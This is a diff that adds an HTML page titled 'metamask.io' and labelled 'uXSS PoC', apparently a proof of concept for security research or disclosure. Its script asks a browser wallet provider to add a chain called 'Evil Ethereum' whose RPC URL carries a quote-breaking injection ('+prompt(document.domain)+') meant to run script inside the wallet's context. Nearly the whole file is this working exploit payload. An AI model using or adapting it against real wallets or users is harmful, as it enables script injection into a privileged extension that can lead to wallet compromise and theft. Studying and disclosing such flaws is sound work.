@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>metamask.io</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: system-ui, sans-serif;
+      text-align: center;
+      padding-top: 20vh;
+    }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 40px;
+    }
+    button {
+      width: 70%;
+      height: 15vh;
+      font-size: 40px;
+      background: #f6851b;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(246,133,27,0.6);
+    }
+    button:hover {
+      background: #e2761b;
+    }
+    .warn {
+      margin-top: 40px;
+      color: #ffcc00;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>uXSS PoC</h1>
+  <button onclick="exploit()">Press me!</button>
+  <script>
+    async function exploit() {
+      try {
+        // Modern wallet provider (EIP-1193)
+        const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
+
+        if (!provider || !provider.request) {
+          alert("No wallet detected (window.ethereum not found)");
+          return;
+        }
+
+        // Trigger wallet_addEthereumChain with malicious RPC URL
+        await provider.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: "0x31339", // Random chain ID
+            chainName: "Evil Ethereum",
+            rpcUrls: ['https://rpc-mumbai.matic.today/x"+prompt(document.domain)+"'], // XSS in RPC URL
+            nativeCurrency: {
+              name: "Evil ETH",
+              symbol: "EVIL",
+              decimals: 18
+            },
+            blockExplorerUrls: ["https://explorer-mumbai.maticvigil.com"]
+          }]
+        });
+
+        alert("wallet_addEthereumChain triggered successfully!");
+
+      } catch (err) {
+        alert("Request rejected or failed: " + (err.message || err));
+        console.error(err);
+      }
+    }
+  </script>
+
+</body>
+</html>
